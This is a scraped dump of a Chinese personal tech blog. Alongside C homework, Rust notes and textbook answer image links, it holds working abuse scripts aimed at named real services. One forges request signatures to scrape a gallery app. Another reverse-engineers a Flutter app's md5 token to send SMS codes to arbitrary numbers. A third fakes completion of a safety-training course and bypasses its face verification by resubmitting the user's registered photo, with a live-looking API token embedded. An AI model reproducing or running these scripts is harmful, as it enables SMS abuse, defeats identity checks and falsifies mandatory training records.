https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_ddaf306f4550db3bf0aa012729509222.jpg\n16 On holiday\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f4a103b18f0052c2ab8e315066c37486.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_b8f814c97832f9c2b9c907c1e4d7f146.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_8cc29188c79b5a607e7762f987946d31.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_f73bc7a21f631fca1635ae17766c983a.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_fd686f64c8ceae5aa5f7370872cbbe89.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2b801df9887c3d422914766db927be05.jpg\nRevision: Units 13-16\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_d35da02c161333d9a2bfe680c40bc6bb.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_57d06d240482e3208ca2a64f2ae87aca.jpg\nTask 4\r#\rhttps://cdn-img.daxuesoutijiang.com/bookimg/dxbook_13c4d2c7df4423430ab3ee01565e3820.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_dd29acac4013b6cd0e393fd4461f69db.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_14672a67687a76fdca930f397223fdff.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a1a1d00bcb9ab823c9a597b47b3d7138.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9595dce2a8a3351dc4c05a6d7d794c88.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a44fcef71697e85f63c05b094362fc8c.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_3fe3d578ea7cfb2c7bf36584b95cf834.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_83a82cc694113e6196f906d1b123da87.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_a17f453e3b93d13d6a538fb51c1d394b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9bcfacef044eb357a4f7a61700b57baa.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_30d3fbd855bc7ff596c01064160e1f47.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_497ec2c95197a23454b8bd2f0a2c6af4.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9b8cda03f0b70897d87605ed488bda9b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_3b5123093038a8daf51fb17bc0e1c87d.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_519bc80f8d253b21b0b4218140a05a20.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_84479c491b63506f56fe68cfbcdfd569.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0ddf7ebb9663441d93d00836152a5d99.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_381f675c72d2ea56c77f180b1499af08.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_828cf3a0141f7a6ec18a3221ee805c85.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_ec6acb13c9918b20d88a7545b5d0805b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_b821a967dcddd84e8a096856fe2f60b0.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_0bfa2565cd160a6bf76494fef0ea95f6.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_bfd2313fd43baca9498286704cae82ec.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2ee3c9e1691c91d794844acac957e82c.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_eac7ba4ce85198fbe3895fed41be915b.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2b0370674c317aaceae3b9a5369000e5.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_21d4c7376a20bc6aac3c2f5db83c8314.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_2898040c19df4ae6cb9f50dcb5a5bcac.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_bc467f87f2e5fd25a8ee5aa9810beaf1.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_066a22b8ce79af1c9f7d8122eb8649ea.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_77ae21c8c419c87313aebe60e5b150eb.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_879609d4148b1380ce09292a8f311ade.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_3323de67cef24c43000534d1560d2fa7.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_43233c6cddf9b35d326d039c65c34227.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_6599258339416e6786d3acf0d551b37d.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_9a32a5e3e4a5d26b93eaedb3204e5a42.jpg https://cdn-img.daxuesoutijiang.com/bookimg/dxbook_6d2b0ab2a0f47c85c52c6425d1672d9e.jpg\n"},{"id":99,"href":"/posts/c-%E4%BD%9C%E4%B8%9A2/","title":"c 作业2","section":"Blog","content":"\r题2\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { float f,x; printf(\u0026#34;请输入一个数\\n\u0026#34;); scanf(\u0026#34;%f\u0026#34;,\u0026amp;x); switch ((int)(x/1)) { case 0: f=0; break; case 1: f=3*x+5; break; case 2: f=3*sin(x)-1; break; case 3: f=log(1+x*x); break; case 4: f=log10(x*x-2*x)+5; break; default: f=-1; break; } printf(\u0026#34;输入:%f,结果:%f\u0026#34;,x,f); } 题3\r#\r#include \u0026lt;stdio.h\u0026gt; int main() { float g,n; float m=0; printf(\u0026#34;请输入重量\\n\u0026#34;); scanf(\u0026#34;%f\u0026#34;,\u0026amp;g); if(g\u0026gt;50) { printf(\u0026#34;拒收\u0026#34;); return 0; } n=g; switch ((int)g/5) { case 10: case 9: case 8: case 7: case 6: m+=5.0*(g-30); g=30; case 5: case 4: m+=4.5*(g-20); g=20; case 3: case 2: m+=4.0*(g-10); g=10; case 1: m+=3.5*(g-5); g=5; case 0: m+=3.0*g; break; default: m=-1; break; } printf(\u0026#34;重量:%.2fkg,快递费:%.2f\u0026#34;,n,m); } "},{"id":100,"href":"/posts/%E6%9F%90%E5%9B%BE%E5%BA%93/","title":"某图库","section":"Blog","content":"一点点加密，随便还找了一个oss直连\nimport random import time def encode(_str): staticchars = \u0026#34;PXhw7UT1B0a9kQDKZsjIASmOezxYG4CHo5Jyfg2b8FLpEvRr3WtVnlqMidu6cN\u0026#34; encodechars = \u0026#34;\u0026#34; for i in range(len(_str)): num0 = staticchars.find(_str[i]) if num0 == -1: code = _str[i] else: code = staticchars[(num0 + 3) % 62] num1 = random.randint(0, 61) num2 = random.randint(0, 61) encodechars += staticchars[num1] + code + staticchars[num2] return encodechars def timestamp(): return str(int(time.time())) def sing(): return encode(\u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuaWQiOiJvMTExMTExMTExMTExMTExMTExMTEiLCJleHBpcmVfdGltZSI6MTY5NzMwNDUzNX0=.)FxVKiDH9rnMKEuTNMkRa7ibMrhp-Vdi-FHBgWOomdaQ###\u0026#34;+timestamp()) import requests headers = { \u0026#39;authority\u0026#39;: \u0026#39;stapi.youpengw.com\u0026#39;, \u0026#39;accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;accept-language\u0026#39;: \u0026#39;zh-CN,zh;q=0.9\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;sec-fetch-dest\u0026#39;: \u0026#39;empty\u0026#39;, \u0026#39;sec-fetch-mode\u0026#39;: \u0026#39;cors\u0026#39;, \u0026#39;sec-fetch-site\u0026#39;: \u0026#39;cross-site\u0026#39;, \u0026#39;sign\u0026#39;: sing(), \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8447\u0026#39;, \u0026#39;xweb_xhr\u0026#39;: \u0026#39;1\u0026#39;, } json_data = { \u0026#39;homepage_id\u0026#39;: \u0026#39;233033\u0026#39;, \u0026#39;classify_id\u0026#39;: 5, \u0026#39;sort_type\u0026#39;: \u0026#39;default\u0026#39;, \u0026#39;album_id\u0026#39;: 0, \u0026#39;uid\u0026#39;: 219050, \u0026#39;page\u0026#39;: 1, \u0026#39;limit\u0026#39;: 32, \u0026#39;action\u0026#39;: \u0026#39;cover\u0026#39;, \u0026#39;version\u0026#39;: 1, \u0026#39;appid\u0026#39;: \u0026#39;wx111117\u0026#39;, \u0026#39;openid\u0026#39;: \u0026#39;1111111\u0026#39;, \u0026#39;timestamp\u0026#39;: 1697353429134, } response = requests.post(\u0026#39;https://xxx.xxxx.com/miniwechat/v1/natujun/photoList\u0026#39;, headers=headers, json=json_data) k=response.json() s=[] for i in k[\u0026#39;data\u0026#39;][\u0026#39;photoList\u0026#39;]: s.append(i[\u0026#39;url\u0026#39;]) print(s) "},{"id":101,"href":"/posts/c%E8%AF%AD%E8%A8%80%E4%BD%9C%E4%B8%9A23-10-10/","title":"c语言作业23/10/10","section":"Blog","content":"\r编程题7\r#\r#include \u0026lt;stdio.h\u0026gt; int main() { int num, a, b, c, d; printf(\u0026#34;请输入一个四位数：\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;num); if (num \u0026gt;= 1000 \u0026amp;\u0026amp; num \u0026lt;= 9999) { a = num % 10; b = num / 100 % 10; c = num / 10 % 10; d = num / 1000; printf(\u0026#34;个位：%d,十位：%d,百位：%d,千位：%d\u0026#34;, a, c, b, d); } else { printf(\u0026#34;重新输入\u0026#34;); } return 0; } 编程题8\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; printf(\u0026#34;请输入半径:\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;圆的半径=%d, 圆的直径=%d, 圆的周长=%.2f\u0026#34;, r, 2*r, PAI*r*2 ); return 0; } 编程题9\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; printf(\u0026#34;请输入半径:\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;半径=%d, 周长=%.2f, 面积=%.2f\u0026#34;, r, 2* PAI*r, PAI*r*r ); return 0; } 编程题11\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { double a=3,b=4,c=6; double p,s; if (a+b\u0026gt;c \u0026amp;\u0026amp; a+c\u0026gt;b \u0026amp;\u0026amp; b+c\u0026gt;a) { p=(a+b+c)/2; s= sqrt (p*(p-a)*(p-b)*(p-c)); printf ( \u0026#34;面积为%lf\\n\u0026#34; , s); } else printf ( \u0026#34;无法构成三角形\\n\u0026#34; ); return 0; } 编程题12\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int a,b; puts(\u0026#34;请输入两个整数\u0026#34;); scanf(\u0026#34;%d,%d\u0026#34;,\u0026amp;a,\u0026amp;b); printf(\u0026#34;和=%d,差=%d,积=%d,商=%.2f,余数=%d\u0026#34;, a+b, a-b, a*b, a/(float)b, a%b ); } 编程题13\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; #define PAI 3.1415926 //圆面积 #define get_round_area(r) PAI * r * r //圆周长 #define get_round_perimeter(r) 2 * PAI * r //球体表面积 #define get_sphere_Sarea(r) 4 * PAI * r *4 * PAI* r //球体体积 #define get_sphere_volume(r) 4.0 / 3 * PAI * r * r * r //圆柱体积 #define get_cylinder_vloume(r,h) get_round_area(r) * h int main() { float r,h; printf(\u0026#34;请输入圆的半径和圆柱的高\\n\u0026#34;); scanf(\u0026#34;%f,%f\u0026#34;,\u0026amp;r,\u0026amp;h); printf(\u0026#34;半径=%.2f，周长=%.2f，面积=%.2f，圆球表面积=%.2f，圆球体积=%.2f，圆柱体积=%.2f\u0026#34;, r, get_round_perimeter(r), get_round_area(r), get_sphere_Sarea(r), get_sphere_volume(r), get_cylinder_vloume(r,h) ); return 0; } 编程题14\r#\r#include \u0026lt;stdio.h\u0026gt; #define PAI 3.1415926 int main() { int r; puts(\u0026#34;请输入半径\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;直径=%d, 周长=%.2f\u0026#34;,2*r,PAI*r*2); return 0; } 编程题15\r#\r#include \u0026lt;stdio.h\u0026gt; int main() { int a,b; puts(\u0026#34;请输入两个整数\u0026#34;); scanf(\u0026#34;%d,%d\u0026#34;,\u0026amp;a,\u0026amp;b); printf(\u0026#34;a=%d, b=%d\u0026#34;,a,b); return 0; } 编程题16\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r=8; printf(\u0026#34;面积=%.2f\u0026#34;,M_PI*r*r); return 0; } 编程题17\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r=5; printf(\u0026#34;周长=%.2f\u0026#34;,M_PI*r*2); return 0; } 编程题18\r#\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int r; puts(\u0026#34;请输入半径\u0026#34;); scanf(\u0026#34;%d\u0026#34;,\u0026amp;r); printf(\u0026#34;周长=%.2f,面积=%.2f\u0026#34;,M_PI*r*2,M_PI*r*r); return 0; } "},{"id":102,"href":"/posts/flutter-%E9%80%86%E5%90%91%E5%B0%8F%E8%AE%A1/","title":"flutter 逆向小计","section":"Blog","content":"某个淘金社区，登陆有md5加密\n用blutter 解析一下，找到hash_update的地址，放到frida的脚本中，在console的下面加一句\nconsole.log(\u0026#39;hexdump\u0026#39;+hexdump(args[0])) 打印出来4个uint32List，虽然看不懂，但是我们打印了hex\n多看几次知道有随机的东西，在多看几次就知道应该是时间戳末尾在控制，反复测试得到所有出现过的字符，易得脚本\nimport requests import hashlib import time def get_data(p): A=[\u0026#39;gcw7eeh5\u0026#39;,\u0026#39;eegc15nnccccoqh5r7\u0026#39;,\u0026#39;15gcnncc\u0026#39;,\u0026#39;h5ccccgc15nnee/i\u0026#39;,\u0026#39;15gcnnq4oq/ih5oqccccee\u0026#39;,\u0026#39;15cc/ir7oqnnq4oqh5\u0026#39;,\u0026#39;nncc/i\u0026#39;,\u0026#39;h515r7q4oqcc\u0026#39;,\u0026#39;oqoqnnr7q4/i\u0026#39;,\u0026#39;h5nn\u0026#39;] B=[\u0026#39;eeoqh5\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;h5ccoqeer7\u0026#39;,\u0026#39;oqr7\u0026#39;,\u0026#39;r7\u0026#39;,\u0026#39;oqccgc\u0026#39;,\u0026#39;oqccgcoqh515r7oqq4\u0026#39;,\u0026#39;oqgcoqnn/i\u0026#39;,\u0026#39;h515oqcc\u0026#39;,\u0026#39;oq\u0026#39;] C=[\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;/iq4\u0026#39;,\u0026#39;q4\u0026#39;,\u0026#39;op\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;gc\u0026#39;,\u0026#39;2115oqr7q4/ioqccgc\u0026#39;] # 16位时间戳 t=str(int(time.time()*1000000)) k=int(t[-1]) # B164D0C43EDB3BAD89D1A073EBE9691D # 为固定值，可能跟随app版本所迭代 #一下情况特殊出现，需要对换位置 if k==8 or k==5: message= \u0026#39;action=sendcode\u0026amp;phone={}\u0026amp;verifytoken={}\u0026amp;verifycodes={}{}B164D0C43EDB3BAD89D1A073EBE9691D..{}W1W2W3W4W5W6W7W8W901020304050607..{}{}\u0026#39;.format(p,\u0026#39;{system::verifytoken}\u0026#39;,\u0026#39;{system::verifytoken}\u0026#39;,A[k],B[k],C[k],t) else: message= \u0026#39;action=sendcode\u0026amp;phone={}\u0026amp;verifytoken={}\u0026amp;verifycodes={}{}W1W2W3W4W5W6W7W8W901020304050607..{}B164D0C43EDB3BAD89D1A073EBE9691D..{}{}\u0026#39;.format(p,\u0026#39;{system::verifytoken}\u0026#39;,\u0026#39;{system::verifytoken}\u0026#39;,A[k],B[k],C[k],t) # print(message) return {\u0026#39;action\u0026#39;:\u0026#39;sendcode\u0026#39;,\u0026#39;phone\u0026#39;:p,\u0026#39;verifytoken\u0026#39;:hashlib.md5(message.encode()).hexdigest(),\u0026#39;verifycodes\u0026#39;:t} data=get_data(\u0026#39;19999994444\u0026#39;) resp=requests.get(\u0026#39;http://bbs.taojingdaohang.cn/index.php\u0026#39;,params=data) print(resp.text) 测试正常发送短信\n"},{"id":103,"href":"/posts/c-donut/","title":"c donut","section":"Blog","content":"C语言旋转甜甜圈\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;Windows.h\u0026gt; void usleep(__int64 usec) { HANDLE timer; LARGE_INTEGER ft; ft.QuadPart = -(10 * usec); timer = CreateWaitableTimer(NULL, TRUE, NULL); SetWaitableTimer(timer, \u0026amp;ft, 0, NULL, NULL, 0); WaitForSingleObject(timer, INFINITE); CloseHandle(timer); } int main() { float A = 0, B = 0; float i, j; int k; float z[1760]; char b[1760]; printf(\u0026#34;\\x1b[2J\u0026#34;); for (;;) { memset(b, 32, 1760); memset(z, 0, 7040); for (j = 0; j \u0026lt; 6.28; j += 0.07) { for (i = 0; i \u0026lt; 6.28; i += 0.02) { float c = sin(i); float d = cos(j); float e = sin(A); float f = sin(j); float g = cos(A); float h = d + 2; float D = 1 / (c * h * e + f * g + 5); float l = cos(i); float m = cos(B); float n = sin(B); float t = c * h * g - f * e; int x = 40 + 30 * D * (l * h * m - t * n); int y = 12 + 15 * D * (l * h * n + t * m); int o = x + 80 * y; int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n); if (22 \u0026gt; y \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; x \u0026gt; 0 \u0026amp;\u0026amp; 80 \u0026gt; x \u0026amp;\u0026amp; D \u0026gt; z[o]) { z[o] = D; b[o] = \u0026#34;.,-~:;=!*#$@\u0026#34;[N \u0026gt; 0 ? N : 0]; } } } printf(\u0026#34;\\x1b[H\u0026#34;); for (k = 0; k \u0026lt; 1761; k++) { putchar(k % 80 ? b[k] : 10); A += 0.00004; B += 0.00002; } usleep(30000); } return 0; } 另一份\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; #include\u0026lt;windows.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { float A = 0, B = 0; float i, j; int k; float z[1760]; char b[1760]; printf(\u0026#34;\\x1b2J\u0026#34;); for (;;) { memset(b, 32, 1760); memset(z, 0, 7040); for (j = 0; j \u0026lt; 6.28; j += 0.07) { for (i = 0; i \u0026lt; 6.28; i += 0.02) { float c = sin(i); float d = cos(j); float e = sin(A); float f = sin(j); float g = cos(A); float h = d + 2; float D = 1 / (c * h * e + f * g + 5); float l = cos(i); float m = cos(B); float n = sin(B); float t = c * h * g - f * e; int x = 40 + 30 * D * (l * h * m - t * n); int y = 12 + 15 * D * (l * h * n + t * m); int o = x + 80 * y; int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n); if (22 \u0026gt; y \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; x \u0026gt; 0 \u0026amp;\u0026amp; 80 \u0026gt; x \u0026amp;\u0026amp; D \u0026gt; z[o]) { z[o] = D; b[o] = \u0026#34;.,-~:;=!*#$@\u0026#34;[N \u0026gt; 0 ? N : 0]; } } } printf(\u0026#34;\\x1bH\u0026#34;); for (k = 0; k \u0026lt; 1761; k++) { putchar(k % 80 ? b[k] : 10); A += 0.00004; B += 0.00002; } Sleep(1); system(\u0026#34;cls\u0026#34;); } return 0; } "},{"id":104,"href":"/posts/%E6%9F%90%E5%88%B7%E8%AF%BE/","title":"某刷课","section":"Blog","content":"无任何难度，android rsa，第二次加入了人脸识别，幌子，直接用实名的人脸绕过\nfrom Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 import base64,requests KEY=\u0026#39;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3Vsn6GuSivbc0mh1QFDjFVMdkb7lcAfsGdw6WuR0yM4GBP5MCJr301VX5aQucOKmpnpR4mhMSaCG0AVbK9VBNlghFcihfn3u4uMPGtqtXzKSJNZmLrzrS7Xd0ecUcAGHAnpEnXXgoUoYrAkthwKTBDayEIygQBrq+nMX53gST9QIDAQAB\u0026#39; def RSA_encrypt(clear): if clear==\u0026#39;\u0026#39;: return \u0026#39;\u0026#39; rsa_key = RSA.import_key(base64.b64decode(KEY)) cipher = PKCS1_v1_5.new(rsa_key) return base64.b64encode(cipher.encrypt(str(clear).encode(\u0026#39;utf-8\u0026#39;))).decode() def course_list(): url=\u0026#39;http://app.lfanpei.com/api/index/apiSafeLearning/learningCourseDetail\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN #print(data) result=requests.post(url,data=data) # print(result.text) cl=[] for i in result.json()[\u0026#39;data\u0026#39;][\u0026#39;apiSafeCourseDetail\u0026#39;][\u0026#39;safeCourseChaptersList\u0026#39;]: for j in i[\u0026#39;apiSafeCourseviewList\u0026#39;]: if j[\u0026#39;faceContrastTimes\u0026#39;]!=1: face_Comparison() return 0 if j[\u0026#39;viewOver\u0026#39;]!=1: # 1 为已完成的 cl.append([j[\u0026#39;viewId\u0026#39;],TIME,j[\u0026#39;courseViewHours\u0026#39;],j[\u0026#39;viewTitle\u0026#39;]]) else: print(\u0026#39;已完成\u0026#39;,j[\u0026#39;viewTitle\u0026#39;]) return cl def learm_update(): url=\u0026#39;http://app.lfanpei.com/api/video/apiSafeView/saveVideoPlayProgress\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId,\u0026#39;viewfileId\u0026#39;:viewfileid,\u0026#39;curPercent\u0026#39;:\u0026#39;100\u0026#39;,\u0026#39;curChapter\u0026#39;:\u0026#39;0\u0026#39;,\u0026#39;viewTime\u0026#39;:TIME,\u0026#39;curView\u0026#39;:\u0026#39;1\u0026#39;,\u0026#39;viewOver\u0026#39;:\u0026#39;1\u0026#39;} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,json=data) print(\u0026#39;\\t\u0026#39;+result.text) if \u0026#39;不符\u0026#39; in result.text: print(\u0026#39;--------------- id \u0026#39;,viewTitle,courseViewHours) print(\u0026#39;exit-----------\u0026#39;) exit() def learm_begin(): url=\u0026#39;http://app.lfanpei.com/api/video/apiSafeView/updateVideoBeginTime\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid,\u0026#39;courseId\u0026#39;:courseId,\u0026#39;viewfileId\u0026#39;:viewfileid,\u0026#39;ip\u0026#39;:\u0026#39;127.0.0.1\u0026#39;} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,data=data) print(\u0026#39;\\t\u0026#39;+result.text) def learm_list(): data = {\u0026#39;apiToken\u0026#39;: TOKEN} result = requests.post(\u0026#39;http://app.lfanpei.com/api/index/apiSafeLearning/oneClickLearningIndex\u0026#39;, data=data) # print(result.text) ll=[] for i in result.json()[\u0026#39;data\u0026#39;][\u0026#39;learningIndexData\u0026#39;][\u0026#39;classmateLearningList\u0026#39;]: ll.append([i[\u0026#39;classId\u0026#39;],i[\u0026#39;name\u0026#39;]]) # print(i[\u0026#39;classId\u0026#39;],i[\u0026#39;name\u0026#39;]) return ll # 人脸图片对比 def face_Comparison(): c=requests.get(get_face_img()).content files={\u0026#39;headPictureFile\u0026#39;:c} data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;, \u0026#39;buisnessId\u0026#39;:classid, \u0026#39;buisnessType\u0026#39;:1, \u0026#39;viewId\u0026#39;:courseid, \u0026#39;courseId\u0026#39;:courseId } data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(\u0026#39;http://app.lfanpei.com/api/liveCheck/apiSafeFace/faceComparison\u0026#39;,data=data,files=files) print(result.text) def get_face_img(): url=\u0026#39;http://app.lfanpei.com/api/user/apiSafeUserInfo/queryUserClassInfo\u0026#39; data={\u0026#39;apiToken\u0026#39;:\u0026#39;\u0026#39;,\u0026#39;classId\u0026#39;:classid} data={k:RSA_encrypt(v) for k,v in data.items()} data[\u0026#39;apiToken\u0026#39;]=TOKEN result=requests.post(url,data).json() # print(result) return result[\u0026#39;data\u0026#39;][\u0026#39;apiClassInformationPo\u0026#39;][\u0026#39;apiUserDataSubmit\u0026#39;][\u0026#39;picture\u0026#39;] # 暂时无用 # def get_classid(): # url=\u0026#39;http://app.lfanpei.com/api/user/apiSafeUserInfo/dataRevision\u0026#39; # result=requests.post(url,data={\u0026#39;apiToken\u0026#39;:TOKEN}).json() # return result[\u0026#39;data\u0026#39;][\u0026#39;classList\u0026#39;][0][\u0026#39;class_id\u0026#39;] TOKEN=\u0026#39;Api eyJhbGciOiJIUzUxMiJ9.eyJhcGlfbG9naW5fdXNlcl9rZXkiOiIzODgwOCNhNzUwMzljYy1mYjUyLTRjZWUtYjY5Ny0zMzRlMTI2YjNjNmIifQ.yQpzqsx1xP4AEmPh_goIQJY61mVTcGWS3Wdqx5FRAgrC89Mm5g_-OYWSTK_kR0bTELxxyoRvDkhxV1n-iOpweQ\u0026#39; courseId=\u0026#39;1603\u0026#39; classid=\u0026#39;279\u0026#39; viewfileid=\u0026#39;3410\u0026#39; # 设置一个时间 200000——6000000 TIME=\u0026#39;510000\u0026#39; # face_Comparison() # learm_begin() # learm_update() # print(get_face_img()) learm_type=1 # 1-\u0026gt;一键学习 if __name__ == \u0026#39;__main__\u0026#39;: if learm_type: for classid,learm_title in learm_list(): print(\u0026#39;当前学习classid\u0026#39;,classid,learm_title) for viewfileid,TIME,courseViewHours,viewTitle in course_list(): print(viewfileid,TIME,courseViewHours,viewTitle) # print(\u0026#39;\\t当前课程courseid\u0026#39;,courseid,viewTitle,courseViewHours) learm_begin() learm_update() else: if TOKEN and courseid: for courseid,TIME,courseViewHours,viewTitle in course_list(): print(\u0026#39;当前课程courseid\u0026#39;,courseid,viewTitle,courseViewHours) learm_begin() learm_update() # eyJhbGciOiAiTm9uZSJ9.eyJhcGlfbG9naW5fdXNlcl9rZXkiOiAiMzc0ODAjODAzYzk3MTItZTYwOC00YTM4LWE1ZjgtNGE5ZGQzNDQxYjA3In0K. "},{"id":105,"href":"/posts/rust/","title":"rust","section":"Blog","content":"\rString\r#\rfn main() { //String和\u0026amp;str的区别可自行百度 //空字符串 let s=String::new(); //可变字符串 let mut s1=String:from(\u0026#34;123\u0026#34;); //追加字符串 s1.push_str(\u0026#34;456\u0026#34;); //追加字符 s1.push(\u0026#34;1\u0026#34;); } json\r#\ruse std::fs::File; use serde_json::Value; fn main(){ //解析io流文件 let f=File::open(\u0026#34;test.txt\u0026#34;).unwrap(); let json:Value=serde_json::from_reader(f).unwrap(); //let json:Value=serde_json::from_str(text).unwrap(); for i in json[\u0026#34;data\u0026#34;].as_array().unwrap(){ println!(\u0026#34;{}\u0026#34;,i[\u0026#34;name\u0026#34;].as_str().unwrap()); } } reqwest\r#\ruse std::{time::{SystemTime, UNIX_EPOCH}}; fn get_time() -\u0026gt; String{ SystemTime::now() .duration_since(UNIX_EPOCH) .unwrap() .as_millis() .to_string() } async fn post() -\u0026gt; Result\u0026lt;String, reqwest::Error\u0026gt;{ let client = reqwest::Client::new(); // let mut headers = HeaderMap::new(); // headers.insert(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;.parse().unwrap()); let time=get_time(); let data=[(\u0026#34;phone\u0026#34;,\u0026#34;17340307464\u0026#34;),(\u0026#34;password\u0026#34;,\u0026#34;d41d8cd98f00b204e9800998ecf8427e\u0026#34;),(\u0026#34;countrycode\u0026#34;,\u0026#34;\u0026#34;),(\u0026#34;rememberLogin\u0026#34;,\u0026#34;true\u0026#34;),(\u0026#34;timerstamp\u0026#34;,\u0026amp;time)]; Ok(client.post(\u0026#34;https://music.163.com/weapi/login/cellphone\u0026#34;).json(\u0026amp;data).send().await?.text().await?) } #[tokio::main] async fn main() { if let Ok(res) = post().await { println!(\u0026#34;{:#?}\u0026#34;, res); } } 集合相关\r#\rfn main() { let a = vec![(2, \u0026#34;aa\u0026#34;), (4, \u0026#34;c\u0026#34;), (3, \u0026#34;cc\u0026#34;)]; let b = vec![(3, \u0026#34;cc\u0026#34;), (5, \u0026#34;ee\u0026#34;), (2, \u0026#34;aa\u0026#34;)]; // 取交集 let intersect = a.iter().filter(|\u0026amp;u| b.contains(u)).collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 交集是：{:?}\u0026#34;, intersect); // 取差集 let minusion = 